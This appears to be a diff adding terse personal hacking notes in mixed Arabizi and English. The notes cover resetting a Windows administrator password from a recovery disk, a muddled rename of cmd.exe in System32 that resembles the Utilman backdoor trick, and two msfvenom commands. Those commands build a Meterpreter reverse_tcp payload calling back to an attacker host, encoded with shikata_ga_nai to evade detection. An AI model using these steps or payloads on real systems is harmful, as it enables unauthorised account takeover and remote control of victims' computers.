@@ -1,0 +1,20 @@
+1.boot from cd (alli3 l laptop men l cd f12 aw 11 aw men usb 3lyha l window )
+2.Next
+3.repair your pc
+4.troubleshoot
+5.command prompt
+6.net user (show all users)
+7.net user administartor [new pass]
+------------------------------------
+usb b7ot 3lyha windows installer
+bios (b2alle3 l usb)
+troubleshoot
+cmd
+cd windows
+cd system32
+ren cmd.exe utilman2.exe
+ren utilman2.exe abc.exe
+------------------------------------
+msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp lhost=192.168.0.10 lport=1234 -b "\x00" -f exe -o system.exe (windos payload to hack can be detected by waf)
+msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp lhost=192.168.0.10 lport=444 -e x86/shikata_ga_nai -i 5 -b "\x00" -f exe -o system.exe (encrypt the payload best encryption is shikataganai)
+
